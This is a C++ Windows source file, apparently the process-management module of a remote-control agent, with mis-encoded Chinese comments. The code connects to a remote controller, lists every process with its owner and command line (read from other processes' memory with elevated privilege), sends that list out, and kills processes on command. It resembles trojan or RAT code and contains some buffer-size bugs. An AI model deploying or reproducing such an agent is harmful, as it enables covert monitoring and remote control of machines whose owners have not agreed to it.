#include "pch.h"
#include "Proc.h"

// Ϊ�˻�ȡPEB�ṹ
typedef struct
{
	DWORD Filler[4];
	DWORD InfoBlockAddress;
} __PEB;

typedef struct
{
	DWORD Filler[17];
	DWORD wszCmdLineAddress;
} __INFOBLOCK;

// ��ȡδ��ʽ������NtQueryInformationProcess���� ��winternl.h�б�����
// ��Ҫ��Ϊ�˻�ȡPEB�ṹ �Ӷ��õ�ָ�����̵���������Ϣ
typedef NTSTATUS(CALLBACK* PFN_NTQUERYINFORMATIONPROCESS)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength OPTIONAL
	);

static Proc gProc;

Proc::Proc() {

	// hunter������ʳ��
	CmdFreshProcs = "FRESH_PROCS";
	CmdKillProc = "KILL_PROC";
	// ʳ�﷢����hunter
	CmdSendProc = "SEND_PROC";
	CmdKillProcSuccess = "KILL_SUCCESS";
	CmdKillProcFailed = "KILL_FAILED";
	// �ָ��������
	CmdSplit = ";";
	CmdEnd = "\r\n";
}

void Proc::startByNewThread(std::string domain, int port)
{
	// �������Ͷ˿ںϲ�Ϊһ��char*
	// ����new�����Ŀռ���fileThreadProc��delete
	char* args = new char[MAX_PATH + sizeof(int)];
	domain.reserve(MAX_PATH);
	memcpy(args, domain.data(), MAX_PATH);
	memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

	// ����ճ�¯��char*����
	HANDLE h = CreateThread(NULL, 0, Proc::procThreadProc, (LPVOID)args, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
	}
}

DWORD Proc::procThreadProc(LPVOID args)
{
	// ��ȡ����������Ͷ˿���Ϣ
	char domain[MAX_PATH];
	memcpy(domain, args, MAX_PATH);
	int port = *((int*)((char*)args + MAX_PATH));

	startProc(domain, port);
	// ������delete
	delete [] (char*)args;
	return true;
}

void Proc::startProc(std::string domain, int port)
{
	TcpSocket sock;
	if (!sock.connectTo(domain, port)) {
		OutputDebugStringA("Failed to connect server for proc\r\n");
	}

	OutputDebugStringA("Started proc\r\n");

	const int packetSize = 800;
	char szData[packetSize];
	int ret;
	std::string buf;

	while (true) {
		// �����ݻ��������� ��ֹռ��cpu
		ret = sock.recvData(szData, packetSize);

		if (ret == SOCKET_ERROR || ret == 0) {
			break;
		}
		// ���յ������ݼ��뵽buffer
		addDataToBuffer(&sock, buf, szData, ret);
	}

	OutputDebugStringA("Finished Proc\r\n");
}


void Proc::addDataToBuffer(TcpSocket* sock, std::string& buf, char* data, int size)
{
	buf.append(data, size);

	// �ָ�ÿ������Ͳ�����ִ��
	int endIndex;
	while ((endIndex = buf.find(gProc.CmdEnd)) >= 0) {
		std::string line = buf.substr(0, endIndex);
		buf.erase(0, endIndex + gProc.CmdEnd.length());

		int firstSplit = line.find(gProc.CmdSplit);
		std::string cmd = line.substr(0, firstSplit);
		line.erase(0, firstSplit + gProc.CmdSplit.length());
		// ִ�б�����
		processCmd(sock, cmd, line);
	}
}

// ���������� ����ӳ�� ��ʳ�����߳���Ľ�����һ���ĵ���
std::map<std::string, std::string> Proc::parseArgs(std::string& data)
{
	std::vector<std::string> v;
	std::string::size_type pos1, pos2;
	pos2 = data.find(gProc.CmdSplit);
	pos1 = 0;
	while (std::string::npos != pos2) {
		v.push_back(data.substr(pos1, pos2 - pos1));
		pos1 = pos2 + gProc.CmdSplit.size();
		pos2 = data.find(gProc.CmdSplit, pos1);
	}
	if (pos1 != data.length()) v.push_back(data.substr(pos1));

	std::map<std::string, std::string> args;
	for (int i = 0; i < (int)v.size() - 1; i += 2) {
		args[v.at(i)] = v.at(i + 1);
	}

	return args;
}

void Proc::processCmd(TcpSocket* sock, std::string& cmd, std::string& data)
{
	std::map<std::string, std::string> args = parseArgs(data);

	if (cmd == gProc.CmdFreshProcs) {
		doFreshProcs(sock);
		return;
	}

	if (cmd == gProc.CmdKillProc) {
		doKillProc(sock, args);
		return;
	}
}

void Proc::doFreshProcs(TcpSocket* sock) {

	std::string data; // ��������

	// ����ctoolhelp�������������̿���
	CToolhelp thProcesses(TH32CS_SNAPPROCESS);
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk = thProcesses.ProcessFirst(&pe);
	for (; fOk; fOk = thProcesses.ProcessNext(&pe)) {

		// �ų������� ��ֹ��hunter��ɾ
		if (pe.th32ProcessID == GetCurrentProcessId()) {
			continue;
		}

		// �õ�pid
		CHAR szPid[8];
		_itoa_s((int)pe.th32ProcessID, szPid, sizeof(szPid), 10);
		// ��ȡ����������
		// ��ʾ����������
		TCHAR szOwner[MAX_PATH + 1];
		if (!GetProcessOwner(pe.th32ProcessID, szOwner, MAX_PATH)) {
			StringCchPrintf(szOwner, sizeof(szOwner), "Cannot get");
		}

		//�õ���������Ϣ
		TCHAR szCmdLine[1024];
		if (!GetProcessCmdLine(pe.th32ProcessID, szCmdLine, _countof(szCmdLine))) {
			StringCchPrintf(szCmdLine, sizeof(szOwner), "Cannot get");
		}

		// ƴ�ӷ�����Ϣ
		data.clear();
		data.append(gProc.CmdSendProc + gProc.CmdSplit);
		data.append("EXENAME" + gProc.CmdSplit);
		data.append(pe.szExeFile + gProc.CmdSplit);
		data.append("PID" + gProc.CmdSplit);
		data.append(szPid + gProc.CmdSplit);
		data.append("OWNER" + gProc.CmdSplit);
		data.append(szOwner + gProc.CmdSplit);
		data.append("COMMAND" + gProc.CmdSplit);
		data.append(szCmdLine + gProc.CmdEnd);
		// ����
		sock->sendData(data.data(), data.size());
	}

}

void Proc::doKillProc(TcpSocket* sock, std::map<std::string, std::string>& args) {

	std::string data; // ������Ϣ
	DWORD dwPid = atoi(args["PID"].data());
	// ��ʼkill����
	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, dwPid);
	do
	{
		if (hProc == NULL) {
			OutputDebugStringA("open process failed\r\n");
			break;
		}
		if (TerminateProcess(hProc, 0) == 0) {
			OutputDebugStringA("terminate process failed\r\n");
			break;
		}

		OutputDebugStringA("kill process successfully\r\n");
		data.append(gProc.CmdKillProcSuccess + gProc.CmdEnd);
		sock->sendData(data.data(), data.size());
		return;

	} while (false);

	data.append(gProc.CmdKillProcFailed + gProc.CmdEnd);
	sock->sendData(data.data(), data.size());
	return;
}

BOOL Proc::GetProcessOwner(HANDLE hProcess, LPTSTR szOwner, size_t cchSize) {

	// �������
	if ((szOwner == nullptr) || (cchSize == 0))
		return(FALSE);

	// ����Ĭ��ֵ
	StringCchPrintf(szOwner, cchSize, "Unknown");

	// �õ��������ƾ��
	HANDLE hToken = nullptr;
	// ������һ���Ƚϸߵ�Ȩ�ޣ���Ϊ����ϵͳ��һ���� �Բ���ϵͳ��ʽ������
	CToolhelp::EnablePrivilege(SE_TCB_NAME, TRUE);
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		CToolhelp::EnablePrivilege(SE_TCB_NAME, FALSE);
		return(FALSE);
	}

	// ��ȡTOKEN_USER�ṹ��С
	DWORD cbti = 0;
	GetTokenInformation(hToken, TokenUser, nullptr, 0, &cbti);

	// �����Ҹ�Ϊdo-while��ʽ �߼������һЩ
	do {
		// ���ڸղ�ֻ�������С ���Է����������ֵ����������
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			break;
		// ����ѿռ�����Žṹ��
		PTOKEN_USER ptiUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, cbti);
		if (ptiUser == nullptr)
			break;

		// �õ�ָ��token��tokenuser��Ϣ
		if (GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti)) {
			SID_NAME_USE   snu;
			TCHAR          szUser[MAX_PATH];
			DWORD          chUser = MAX_PATH;
			PDWORD         pcchUser = &chUser;
			TCHAR          szDomain[MAX_PATH];
			DWORD          chDomain = MAX_PATH;
			PDWORD         pcchDomain = &chDomain;

			// ͨ���û�SID��ȡ�û�������������
			if (LookupAccountSid(
				nullptr,
				ptiUser->User.Sid,
				szUser,
				pcchUser,
				szDomain,
				pcchDomain,
				&snu)) {
				// ����\\DomainName\UserName��ʽ���ַ���
				_tcscpy_s(szOwner, cchSize, TEXT("\\\\"));
				_tcscat_s(szOwner, cchSize, szDomain);
				_tcscat_s(szOwner, cchSize, TEXT("\\"));
				_tcscat_s(szOwner, cchSize, szUser);
			}
		}

		// �ͷ��ڴ�
		HeapFree(GetProcessHeap(), 0, ptiUser);

	} while (FALSE);

	// �ͷž��
	CloseHandle(hToken);

	// ����Ȩ������
	CToolhelp::EnablePrivilege(SE_TCB_NAME, FALSE);

	return(TRUE);
}

// ͨ������pid��ȡ����������
BOOL Proc::GetProcessOwner(DWORD PID, LPTSTR szOwner, DWORD cchSize) {

	// �������
	if ((PID <= 0) || (szOwner == nullptr))
		return(FALSE);

	// �򿪽��̾��
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, PID);
	if (hProcess == nullptr)
		return(FALSE);

	// ���ǵ��������Ǹ�����
	BOOL bReturn = GetProcessOwner(hProcess, szOwner, cchSize);

	// �ͷž��
	CloseHandle(hProcess);

	return(bReturn);
}


BOOL Proc::GetProcessCmdLine(HANDLE hProcess, LPTSTR szCmdLine, DWORD Size) {



	// �������
	if ((hProcess == nullptr) || (szCmdLine == nullptr) || (Size == 0))
		return(FALSE);

	// 0. ����Ҫ��ý��̵�PEB��ַ
	DWORD dwSize;
	SIZE_T size;
	PROCESS_BASIC_INFORMATION  pbi;
	// ����PEB�ṹ��xpϵͳ��ʼ�����ڽ��������ַ�ռ��е�0x7ffdf000λ��
	// ����PEB�ĵ�ַ��ÿһ�汾Windows�����������
	// ��������õ�PEB����ȷ����
	// ��ͨ��NtQueryInformationProcess�����õ�PROCESS_BASIC_INFORMATION�ṹ
	// NtQueryInformationProcess����ʧ��ʱ�᷵�ظ���
	if (0 > _NtQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		&dwSize)) {
		return FALSE;
	}

	// 1. ͨ��pbi�ṩ��PEB��ַ�ҵ����̻�����
	__PEB PEB;
	size = dwSize;
	if (!ReadProcessMemory(
		hProcess,
		pbi.PebBaseAddress,
		&PEB,
		sizeof(PEB),
		&size)) {
		return(FALSE);
	}

	// 2. ��PEB�ṹ�л�ȡָ�����������������Ϣ�Ľṹ��ָ��
	__INFOBLOCK Block;
	if (!ReadProcessMemory(
		hProcess,
		(LPVOID)PEB.InfoBlockAddress,
		&Block,
		sizeof(Block),
		&size)) {
		return(FALSE);
	}

	// 3. ��ȡ��������Ϣ ע�� ����Unicodeȥ�ӵ�
	wchar_t wszCmdLine[MAX_PATH + 1];
	if (!ReadProcessMemory(
		hProcess,
		(LPVOID)Block.wszCmdLineAddress,
		wszCmdLine,
		MAX_PATH * sizeof(wchar_t),
		&size)) {
		return(FALSE);
	}

	//    �ļ�·���п�������������ʽ"c:\...\app.exe" �� c:\...\app.exe
	wchar_t* pPos = wszCmdLine; // �õ���һ�����ַ�λ��

	// ���Ѿ������ļ�·������������Ϣ���ƻ�ȥ
	if (pPos != nullptr && *pPos != L'\0') {

		WideCharToMultiByte(CP_OEMCP, 0, wszCmdLine, _countof(wszCmdLine), szCmdLine, sizeof(szCmdLine), NULL, FALSE);
	}
	else {
		// ����Ĭ��ֵ
		StringCchPrintf(szCmdLine, Size, "Unknown");
	}
	// ���ж�û���� ����true
	return(TRUE);
}

// ͨ��pid��ȡָ��������������Ϣ
BOOL Proc::GetProcessCmdLine(DWORD PID, LPTSTR szCmdLine, DWORD Size) {

	// �������
	if ((PID <= 0) || (szCmdLine == nullptr))
		return(FALSE);

	// ��ָ�����̶��� ���Ƿ���Ȩ�޲鿴
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, PID);
	if (hProcess == nullptr)
		return(FALSE);
	// ����· ִ������汾�ĺ���
	BOOL bReturn = GetProcessCmdLine(hProcess, szCmdLine, Size);

	// �ͷž��
	CloseHandle(hProcess);

	return(bReturn);
}


// ��װ����ʽ�����NtQueryInformationProcess
NTSTATUS Proc::_NtQueryInformationProcess(
	HANDLE hProcess,
	PROCESSINFOCLASS pic,
	PVOID pPI,
	ULONG cbSize,
	PULONG pLength
) {

	HMODULE hNtDll = LoadLibrary(TEXT("ntdll.dll"));
	if (hNtDll == nullptr) {
		return(-1);
	}

	NTSTATUS lStatus = -1;  // Ĭ�Ϸ���-1

	// �õ�NtQueryInformationProcess��������
	// ע�⣺dll�еĺ���������char
	PFN_NTQUERYINFORMATIONPROCESS pfnNtQIP =
		(PFN_NTQUERYINFORMATIONPROCESS)GetProcAddress(hNtDll, "NtQueryInformationProcess");
	if (pfnNtQIP != nullptr) {
		lStatus = pfnNtQIP(hProcess, pic, pPI, cbSize, pLength);
	}
	// �ͷŶ�̬��
	FreeLibrary(hNtDll);
	return(lStatus); // ����NTSTATUS�ṹ
}
